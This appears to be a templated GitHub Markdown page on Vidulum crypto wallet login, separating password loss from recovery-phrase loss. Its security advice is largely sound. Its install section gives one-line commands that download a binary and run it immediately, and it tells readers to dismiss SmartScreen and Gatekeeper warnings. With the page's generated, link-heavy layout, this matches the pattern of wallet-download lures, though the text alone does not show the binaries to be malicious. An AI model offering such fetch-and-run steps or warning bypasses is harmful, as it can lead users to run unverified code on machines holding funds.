![Vidulum](../assets/banner-article.png)

# Vidulum Wallet Login: What Credentials Do and Do Not Recover

There is no account to reset - and that changes what a forgotten password costs you.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

Reinstall from the [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) if the application itself is the obstacle.

> A password protects the file on your machine. Only the phrase gets your coins back.

Vidulum is not a hosted account, so "login" means unlocking a wallet that already exists on your machine. A forgotten password is a local problem with a local answer. A forgotten recovery phrase is not recoverable by anyone. This page separates those two failures, because treating them as one is how people lose balances.

<!-- ARTICLE-BODY-BEGIN -->

## What the password protects

A local password encrypts the wallet data stored on your device. It stops someone who picks up your computer from opening the application and spending. It does not encrypt the blockchain, and it does not exist on any server.

That means three things follow. The password can be changed locally while you still have access. It cannot be reset by a third party, because no third party holds it. And losing it does not destroy the coins, because the coins are derived from the phrase, not from the password.

## Why a reset does not exist

An account reset needs a server that knows who you are. Self-custody removes that server on purpose: there is no identity record, no email bound to a balance, and no authority that can reissue access.

Search results promising a password reset are describing a product that does not exist here. Some are simply wrong; others are phishing for the phrase that a "reset" would supposedly require.

## The two failures, side by side

| What you lost | What still works | What to do |
| --- | --- | --- |
| Password, phrase intact | Everything, after a restore | Reinstall, choose restore, enter the phrase |
| Phrase, password intact | Local access only, until the device fails | Export what you can, then create a new wallet |
| Both lost | Nothing | There is no route back in |
| Device lost, phrase intact | Everything | Restore on a new machine |

The second row is the one people postpone, and postponing it converts a recoverable position into the third row.

## If you still have the phrase

1. Install the current release on the machine you will use.
2. Choose the restore option rather than creating a new wallet.
3. Enter the phrase in the application's own screen.
4. Confirm the addresses and balances match what you expect.

Do not enter the phrase into a web page that offers to check it, and do not accept remote help while you type it. The restore screen of software you installed is the only place it belongs.

Restoring with the phrase is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md">Vidulum Wallet recovery phrase restore</a>.

## If the phrase is gone

Export any private keys you can still reach, from any install that still opens, and move those balances to a wallet you control. That rescues individual addresses, not the whole wallet. Anything you cannot export is unreachable once the device or the install is gone.

Say it plainly: there is no recovery service, and anyone offering one is selling something they cannot deliver.

The <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-support-email-channels.md">Vidulum Wallet support channels</a> page explains what support cannot do, and why.

If the application itself will not start, the <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-download-windows-macos-linux.md">Vidulum Wallet download for Windows, macOS and Linux</a> page covers reinstall.

Reinstall from the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> page rather than any mirror you find.

## FAQ

### Can I reset my Vidulum password online?

No. There is no hosted account to reset.

### Does the password protect my coins?

It protects the local wallet data. The coins are controlled by the phrase.

### I forgot both. Is there any hope?

No. Without the phrase or an exported key, the addresses cannot be opened by anyone.

### Should I reinstall to fix a login problem?

Reinstall the current release, then restore from the phrase. Reinstalling alone does not recover access.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[Restore from a phrase](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md) - [Support channels](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-support-email-channels.md) - [Wallet download](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-download-windows-macos-linux.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
